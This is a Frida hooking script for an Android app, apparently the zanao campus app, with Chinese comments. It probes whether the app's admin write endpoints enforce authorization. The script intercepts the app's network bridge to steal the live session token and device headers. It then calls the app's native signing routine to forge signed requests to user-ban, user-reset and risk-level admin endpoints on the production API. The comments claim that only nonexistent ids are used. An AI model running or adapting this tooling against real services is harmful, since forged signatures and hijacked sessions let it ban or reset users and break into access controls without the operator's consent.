// probe24.js — 写类 admin 接口鉴权探测
// 目标一律用【不存在】的 id / uid（1、999999999999），
// 目的只判断"鉴权是否在参数校验之前"，不给任何真实帖子和用户造成影响。
var TOKEN = null, ALIAS = null, DEVICE = null;

function sign(f) {
    var T = Java.use('java.util.TreeMap'), m = T.$new();
    for (var k in f) m.put(String(k), String(f[k]));
    return Java.use('com.comingx.zanao.utils.JniUtils').makeSign(m);
}
function api(path, data) {
    var S = Java.use('java.lang.String'), HUC = Java.use('java.net.HttpURLConnection');
    var url = 'http://api.app.zanao.com' + path;
    var c = Java.cast(Java.use('java.net.URL').$new(url).openConnection(), HUC);
    c.setRequestMethod('POST');
    c.setConnectTimeout(12000); c.setReadTimeout(20000); c.setDoInput(true); c.setDoOutput(true);
    var nd = '', td = String(Math.floor(Date.now() / 1000));
    for (var i = 0; i < 20; i++) nd += Math.floor(Math.random() * 10);
    var si = { timestamp__: td, randnum__: nd };
    for (var kk in data) si[kk] = data[kk];
    var h = {
        'X-Sc-Alias': ALIAS, 'X-Sc-Token': TOKEN, 'X-Sc-Client': 'app',
        'X-Sc-Device': DEVICE, 'X-Sc-Platform': 'Android', 'X-Sc-Hb-V': '210',
        'X-Sc-Nt-V': '310', 'X-Sc-Version': '3.1.0', 'X-Sc-Nd': nd, 'X-Sc-Td': td,
        'X-Sc-Ah': sign(si), 'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'okhttp/4.10.0'
    };
    for (var k2 in h) c.setRequestProperty(k2, String(h[k2]));
    var bs = S.$new(JSON.stringify(data)).getBytes('UTF-8'), arr = [];
    for (var j = 0; j < bs.length; j++) arr.push(bs[j]);
    var os = c.getOutputStream(); os.write(Java.array('byte', arr)); os.flush(); os.close();
    var code = c.getResponseCode();
    var is = (code >= 400) ? c.getErrorStream() : c.getInputStream(), txt = '';
    if (is !== null) {
        var BAOS = Java.use('java.io.ByteArrayOutputStream'), buf = Java.array('byte', new Array(4096).fill(0)), b = BAOS.$new();
        while (true) { var n = is.read(buf); if (n <= 0) break; b.write(buf, 0, n); }
        is.close(); txt = String(S.$new(b.toByteArray(), 'UTF-8'));
    }
    var j = null; try { j = JSON.parse(txt); } catch (e) { }
    return { code: code, json: j, raw: j ? null : txt.substring(0, 120) };
}
function run() {
    var TID = '1', UID = '1';
    var cases = [
        ['/mx/admin/userforbid', { uid: UID }],
        ['/mx/admin/userreset', { uid: UID }],
        ['/mx/admin/risklevelset', { uid: UID, risk_level: 0 }],
        ['/mx/admin/userforbid', { uid: '0' }],
        ['/mx/admin/userreset', { uid: '0' }],
        ['/thread/admin/userforbid', { uid: UID }]
    ];
    var out = [];
    for (var i = 0; i < cases.length; i++) {
        var r = api(cases[i][0], cases[i][1]);
        out.push({ path: cases[i][0], data: JSON.stringify(cases[i][1]),
                   errno: r.json && r.json.errno, errmsg: r.json && r.json.errmsg,
                   verdict: (r.json && r.json.errno === 10 && String(r.json.errmsg).indexOf('无操作权限') >= 0) ? 'GATED-BY-ROLE' : 'CHECK' });
    }    send({ t: 'results', list: out });
}
(function w(t) {
    if (typeof Java !== 'undefined') {
        Java.perform(function () {
            var N = Java.use('com.comingx.zanao.JSIs.NetworkJSI');
            ['request', 'easyRequest'].forEach(function (m) {
                if (!N[m]) return;
                N[m].overloads.forEach(function (ov) {
                    if (ov.argumentTypes.length !== 1 || ov.argumentTypes[0].className !== 'java.lang.String') return;
                    ov.implementation = function (s) {
                        try {
                            if (!TOKEN && s && s.indexOf('X-Sc-Token') >= 0) {
                                var p = JSON.parse(s), v = p.parameters[0].value;
                                TOKEN = v.header['X-Sc-Token']; ALIAS = v.header['X-Sc-Alias']; DEVICE = v.header['X-Sc-Device'];
                                setTimeout(function () { try { run(); } catch (e) { send({ t: 'run-err', m: '' + e }); } }, 2000);
                            }
                        } catch (e) { }
                        return ov.call(this, s);
                    };
                });
            });
        });
        return;
    }
    if (t <= 0) return;
    setTimeout(function () { w(t - 1); }, 200);
})(200);
